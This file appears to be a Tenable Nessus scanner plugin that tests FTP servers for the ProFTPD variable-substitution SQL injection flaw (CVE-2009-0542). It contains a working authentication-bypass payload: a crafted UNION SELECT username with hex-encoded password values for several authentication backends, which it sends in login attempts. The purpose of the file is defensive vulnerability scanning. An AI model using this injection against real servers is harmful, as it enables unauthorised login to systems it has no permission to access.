#
# (C) Tenable Network Security, Inc.
#

if ( NASL_LEVEL < 3000 ) exit(0);
include("compat.inc");

if (description)
{
  script_id(35690);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2017/04/25 20:29:05 $");

  script_cve_id("CVE-2009-0542");
  script_bugtraq_id(33722);
  script_osvdb_id(51953);
  script_xref(name:"EDB-ID", value:"8037");
  script_xref(name:"Secunia", value:"33842");

  script_name(english:"ProFTPD Username Variable Substitution SQL Injection");
  script_summary(english:"Attempts to bypass authentication with a specially crafted username.");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is using ProFTPD, a free FTP server for Unix and
Linux.

The variable substitution feature in the version of ProFTPD running on
the remote host can be abused to conduct a SQL injection attack. For
example, a remote attacker can bypass authentication using a specially
crafted username containing a percent sign character ('%'), a single
quote, and SQL code.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500823/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://bugs.proftpd.org/show_bug.cgi?id=3124");
  script_set_attribute(attribute:"see_also", value:"http://bugs.proftpd.org/show_bug.cgi?id=3180");
  # https://web.archive.org/web/20090413040955/http://www.proftpd.org/docs/RELEASE_NOTES-1.3.2rc3
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?53aa5065");
  # https://web.archive.org/web/20140801165623/http://www.proftpd.org/docs/NEWS-1.3.2rc3
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bc606125");
  script_set_attribute(attribute:"see_also", value:"http://comments.gmane.org/gmane.comp.security.oss.general/1489");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ProFTPD 1.3.2rc3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# Unless we're paranoid, make sure the banner, if there is one,
# looks like ProFTPD.
if (report_paranoia < 2)
{
  banner = get_ftp_banner(port:port);
  if (
    banner &&
    " ProFTPD" >!< banner &&
    "(ProFTPD)" >!< banner &&
    "220 FTP Server ready" >!< banner
  ) audit(AUDIT_NOT_LISTEN, 'ProFTPD', port);
}

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

home_dir = "/";
pass = 1;
shell = "/bin/sh";
# nb: these passwords must correspond to the one above!
passes = make_array();
passes['backend'] = hexify(str:"606717496665bcba");
passes['crypt'] = "0x24312452565a583533784324716a304d4d6b4670426b4b486177644264756634392f";
passes['openssl'] = hexify(str:"{md5}xMpCOKC5I4INzFCab3WEmw==");
passes['plaintext'] = "1";
passes['empty'] = "1";

# For each authentication type, try to bypass authentication.
foreach authtype (keys(passes))
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  user = strcat(
    "%') UNION SELECT ",
      "1,",
      passes[authtype], ",",
      "NULL,",
      "NULL,",
      hexify(str:home_dir), ",",
      hexify(str:shell), " #"
  );
  rc = ftp_authenticate(socket:soc, user:user, pass:pass);
  ftp_close(socket:soc);

  if (rc)
  {
    if (report_verbosity > 0)
    {
      report = strcat(
'\nNessus was able to log in using the following credentials :\n\n',
'  Username : ', user, '\n',
'  Password : ', pass, '\n',
'\nNote that you should probably telnet to the port directly and simulate\n',
'a login as FTP clients may reject or mangle the username reported here.\n'  );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_LISTEN_NOT_VULN, 'FTP Server', port);
